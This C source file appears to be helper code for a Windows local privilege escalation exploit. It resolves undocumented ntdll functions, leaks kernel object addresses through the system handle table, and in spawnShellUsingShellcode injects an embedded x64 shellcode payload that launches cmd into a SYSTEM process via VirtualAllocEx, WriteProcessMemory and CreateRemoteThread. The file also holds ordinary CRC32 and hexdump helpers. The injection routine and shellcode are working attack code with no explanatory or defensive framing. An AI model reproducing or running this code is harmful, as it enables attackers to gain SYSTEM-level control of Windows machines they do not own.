#include "init.h"
#include <stdio.h>

//PNtQueryInformationToken ntQueryInformationToken;
PNtQuerySystemInformation ntQuerySystemInformation;
PNtCreateFile ntCreateFile;
PNtFsControlFile ntFsControlFile;

static const DWORD CRC_table[256] =
{
    0x00000000, 0x77073096, 0xee0e612c, 0x990951ba, 0x076dc419, 0x706af48f,
    0xe963a535, 0x9e6495a3, 0x0edb8832, 0x79dcb8a4, 0xe0d5e91e, 0x97d2d988,
    0x09b64c2b, 0x7eb17cbd, 0xe7b82d07, 0x90bf1d91, 0x1db71064, 0x6ab020f2,
    0xf3b97148, 0x84be41de, 0x1adad47d, 0x6ddde4eb, 0xf4d4b551, 0x83d385c7,
    0x136c9856, 0x646ba8c0, 0xfd62f97a, 0x8a65c9ec, 0x14015c4f, 0x63066cd9,
    0xfa0f3d63, 0x8d080df5, 0x3b6e20c8, 0x4c69105e, 0xd56041e4, 0xa2677172,
    0x3c03e4d1, 0x4b04d447, 0xd20d85fd, 0xa50ab56b, 0x35b5a8fa, 0x42b2986c,
    0xdbbbc9d6, 0xacbcf940, 0x32d86ce3, 0x45df5c75, 0xdcd60dcf, 0xabd13d59,
    0x26d930ac, 0x51de003a, 0xc8d75180, 0xbfd06116, 0x21b4f4b5, 0x56b3c423,
    0xcfba9599, 0xb8bda50f, 0x2802b89e, 0x5f058808, 0xc60cd9b2, 0xb10be924,
    0x2f6f7c87, 0x58684c11, 0xc1611dab, 0xb6662d3d, 0x76dc4190, 0x01db7106,
    0x98d220bc, 0xefd5102a, 0x71b18589, 0x06b6b51f, 0x9fbfe4a5, 0xe8b8d433,
    0x7807c9a2, 0x0f00f934, 0x9609a88e, 0xe10e9818, 0x7f6a0dbb, 0x086d3d2d,
    0x91646c97, 0xe6635c01, 0x6b6b51f4, 0x1c6c6162, 0x856530d8, 0xf262004e,
    0x6c0695ed, 0x1b01a57b, 0x8208f4c1, 0xf50fc457, 0x65b0d9c6, 0x12b7e950,
    0x8bbeb8ea, 0xfcb9887c, 0x62dd1ddf, 0x15da2d49, 0x8cd37cf3, 0xfbd44c65,
    0x4db26158, 0x3ab551ce, 0xa3bc0074, 0xd4bb30e2, 0x4adfa541, 0x3dd895d7,
    0xa4d1c46d, 0xd3d6f4fb, 0x4369e96a, 0x346ed9fc, 0xad678846, 0xda60b8d0,
    0x44042d73, 0x33031de5, 0xaa0a4c5f, 0xdd0d7cc9, 0x5005713c, 0x270241aa,
    0xbe0b1010, 0xc90c2086, 0x5768b525, 0x206f85b3, 0xb966d409, 0xce61e49f,
    0x5edef90e, 0x29d9c998, 0xb0d09822, 0xc7d7a8b4, 0x59b33d17, 0x2eb40d81,
    0xb7bd5c3b, 0xc0ba6cad, 0xedb88320, 0x9abfb3b6, 0x03b6e20c, 0x74b1d29a,
    0xead54739, 0x9dd277af, 0x04db2615, 0x73dc1683, 0xe3630b12, 0x94643b84,
    0x0d6d6a3e, 0x7a6a5aa8, 0xe40ecf0b, 0x9309ff9d, 0x0a00ae27, 0x7d079eb1,
    0xf00f9344, 0x8708a3d2, 0x1e01f268, 0x6906c2fe, 0xf762575d, 0x806567cb,
    0x196c3671, 0x6e6b06e7, 0xfed41b76, 0x89d32be0, 0x10da7a5a, 0x67dd4acc,
    0xf9b9df6f, 0x8ebeeff9, 0x17b7be43, 0x60b08ed5, 0xd6d6a3e8, 0xa1d1937e,
    0x38d8c2c4, 0x4fdff252, 0xd1bb67f1, 0xa6bc5767, 0x3fb506dd, 0x48b2364b,
    0xd80d2bda, 0xaf0a1b4c, 0x36034af6, 0x41047a60, 0xdf60efc3, 0xa867df55,
    0x316e8eef, 0x4669be79, 0xcb61b38c, 0xbc66831a, 0x256fd2a0, 0x5268e236,
    0xcc0c7795, 0xbb0b4703, 0x220216b9, 0x5505262f, 0xc5ba3bbe, 0xb2bd0b28,
    0x2bb45a92, 0x5cb36a04, 0xc2d7ffa7, 0xb5d0cf31, 0x2cd99e8b, 0x5bdeae1d,
    0x9b64c2b0, 0xec63f226, 0x756aa39c, 0x026d930a, 0x9c0906a9, 0xeb0e363f,
    0x72076785, 0x05005713, 0x95bf4a82, 0xe2b87a14, 0x7bb12bae, 0x0cb61b38,
    0x92d28e9b, 0xe5d5be0d, 0x7cdcefb7, 0x0bdbdf21, 0x86d3d2d4, 0xf1d4e242,
    0x68ddb3f8, 0x1fda836e, 0x81be16cd, 0xf6b9265b, 0x6fb077e1, 0x18b74777,
    0x88085ae6, 0xff0f6a70, 0x66063bca, 0x11010b5c, 0x8f659eff, 0xf862ae69,
    0x616bffd3, 0x166ccf45, 0xa00ae278, 0xd70dd2ee, 0x4e048354, 0x3903b3c2,
    0xa7672661, 0xd06016f7, 0x4969474d, 0x3e6e77db, 0xaed16a4a, 0xd9d65adc,
    0x40df0b66, 0x37d83bf0, 0xa9bcae53, 0xdebb9ec5, 0x47b2cf7f, 0x30b5ffe9,
    0xbdbdf21c, 0xcabac28a, 0x53b39330, 0x24b4a3a6, 0xbad03605, 0xcdd70693,
    0x54de5729, 0x23d967bf, 0xb3667a2e, 0xc4614ab8, 0x5d681b02, 0x2a6f2b94,
    0xb40bbe37, 0xc30c8ea1, 0x5a05df1b, 0x2d02ef8d
};

DWORD NTAPI RtlComputeCrc32(DWORD dwInitial, const BYTE* pData, INT iLen)
{
    DWORD crc = ~dwInitial;
    while (iLen > 0)
    {
        crc = CRC_table[(crc ^ *pData) & 0xff] ^ (crc >> 8);
        pData++;
        iLen--;
    }
    return ~crc;
}

#ifndef HEXDUMP_COLS
#define HEXDUMP_COLS 16
#endif


void hexdump(BYTE* mem, unsigned int len)
{
    unsigned int i, j;

    for (i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++)
    {
        /* print offset */
        if (i % HEXDUMP_COLS == 0)
        {
            printf("0x%06x: ", i);
        }

        /* print hex data */
        if (i < len)
        {
            printf("%02x ", 0xFF & ((char*)mem)[i]);
        }
        else /* end of block, just aligning for ASCII dump */
        {
            printf("   ");
        }

        /* print ASCII dump */
        if (i % HEXDUMP_COLS == (HEXDUMP_COLS - 1))
        {
            for (j = i - (HEXDUMP_COLS - 1); j <= i; j++)
            {
                if (j >= len) /* end of block, not really printing */
                {
                    putchar(' ');
                }
                else if (isprint(((char*)mem)[j] & 0xff)) /* printable char */
                {
                    putchar(0xff & ((char*)mem)[j]);
                }
                else /* other char */
                {
                    putchar('.');
                }
            }
            putchar('\n');
        }
    }
}

void catchErr(int code) {
    printf("[*] code: %llx\n", code);

    DWORD t = GetLastError();
    printf("[*] GetLastError: %d\n", t);
    //if (t != 0) exit(-1);
}

DWORD32 initNTFunction() {
    HANDLE curr_proc_hdl = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
    if (!curr_proc_hdl) return -1;
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));

    ntQuerySystemInformation = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
    //ntQueryInformationToken = (PNtQueryInformationToken)GetProcAddress(ntdll, "NtQueryInformationToken");
    ntFsControlFile = (PNtFsControlFile)GetProcAddress(ntdll, "NtFsControlFile");
    ntCreateFile = (PNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");

    //if (ntQueryInformationToken == 0) return -1;
    if (ntQuerySystemInformation == 0) return -1;
    if (ntCreateFile == 0) return -1;
    if (ntFsControlFile == 0) return -1;

    return 1;
}

DWORD64 getObjAddr(HANDLE objHdl, DWORD targetPID) {
    ULONG len = 20;
    NTSTATUS status = (NTSTATUS)0xc0000004;
    PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
    do {
        len *= 2;
        pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);
        status = ntQuerySystemInformation((SYSTEM_INFORMATION_CLASS)64, pHandleInfo, len, &len);     //SystemExtendedHandleInformation

    } while (status == (NTSTATUS)0xc0000004);

    if (status != (NTSTATUS)0x0) return -1;

    for (int i = 0; i < pHandleInfo->HandleCount; i++) {
        PVOID object = pHandleInfo->Handles[i].Object;
        HANDLE handle = pHandleInfo->Handles[i].HandleValue;
        HANDLE pid = pHandleInfo->Handles[i].UniqueProcessId;
        if (targetPID == (DWORD)pid && handle == objHdl) {
            return (DWORD64)object;
        }
    }
    return -1;
}

void spawnShellUsingShellcode(size_t processID)
{
    HANDLE hSystemProcess = INVALID_HANDLE_VALUE;
    PVOID  pLibRemote;
    // DWORD processID;
    unsigned char shellcode[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
        "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
        "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
        "\x00";



    hSystemProcess = OpenProcess(GENERIC_ALL, 0, processID);

    if (hSystemProcess == INVALID_HANDLE_VALUE || hSystemProcess == (HANDLE)0)
    {
        printf("[-] Couldn't open system process...\n");
        exit(1);
    }
    printf("[+] Got a handle on a system Process: %08p\n", hSystemProcess);


    pLibRemote = VirtualAllocEx(hSystemProcess, NULL, sizeof(shellcode) * 2, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    if (!pLibRemote)
    {
        printf("[-] Virtual alloc failed !\n");
        exit(0);
    }

    printf("[+] Allocation in system process succeded with address %08p\n", pLibRemote);

    if (!WriteProcessMemory(hSystemProcess, pLibRemote, shellcode, sizeof(shellcode), NULL))
    {
        printf("[-] WriteProcessMemory failed !\n");
        exit(1);
    }

    HANDLE hThread = CreateRemoteThread(hSystemProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLibRemote, NULL, 0, NULL);

    printf("[+] Writing in system process succeded\n");

    if (hThread == NULL) {
        printf("[-] CreateRemoteThread failed !\n");
        exit(1);
    }
    else
        printf("[+] Remote thread created !\n");

    getchar();
    puts("[*] End session.");
    CloseHandle(hSystemProcess);
}